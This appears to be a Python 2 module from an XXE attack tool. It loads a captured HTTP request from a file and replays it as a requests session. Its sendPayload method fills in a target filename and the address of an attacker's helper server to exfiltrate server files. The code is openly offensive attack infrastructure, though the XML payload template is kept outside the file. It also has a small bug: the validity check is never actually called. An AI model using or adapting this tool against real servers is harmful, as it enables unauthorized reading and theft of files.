from BaseHTTPServer import BaseHTTPRequestHandler
from StringIO import StringIO
import requests




class HTTPFileParser(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.request_text = request_text
        self.rfile = StringIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()

    def send_error(self, code, message):
        self.error_code = code
        self.error_message = message
    
    def extractPostData(self):
        if self.command != 'POST':
            return
        
        line = self.request_text.split('\n')[0]
        newline = '\r\n' if line.endswith('\r') else '\n'
        doubleReturn = newline + newline
        data = self.request_text.split(doubleReturn)[1:]
        return data[0]
        

class AttackSession(object):
    
    def __init__(self, requestFile, uri="http", proxies=None):
        self.requestFile = requestFile
        self.uri = uri
        self.url = ''
        self.proxies = proxies
        self.requestHandler = self.requestFromFile(requestFile)
        self.postData = self.getPostData()
        self.requestSession = self.makeRequestSession()
        
    def isValidFile(self):
        if self.requestHandler.error_code:
            return False
        else:
            return True
    
    def getPostData(self):
        if self.isValidFile:
            return self.requestHandler.extractPostData()
        else:
            return None

    def requestFromFile(self, requestFileName):
        with open(requestFileName,'r') as fp:
            raw_request = fp.read()
        requestHandler = HTTPFileParser(raw_request)
        return requestHandler
    
    
    def makeRequestSession(self):
        host = self.requestHandler.headers.getheader('host',None)
        path = self.requestHandler.path
        self.url = self.uri + "://" + host + path
    
        session = requests.Session()

        for header in self.requestHandler.headers.keys():
            if header != 'content-length':
                session.headers.update({header : self.requestHandler.headers.getheader(header)})
        
        if self.proxies:
            session.proxies = self.proxies
        return session
    

    def sendPayload(self, targetFilename, xxeHelperServerInterface, xxeHelperServerPort):
        payload = self.postData.format(targetFilename=targetFilename, xxeHelperServerInterface=xxeHelperServerInterface, xxeHelperServerPort=xxeHelperServerPort)
        
        res = self.requestSession.post(self.url,payload)
        return res
        
    def spitFile(self, targetFileName):
        return targetFileName
    
    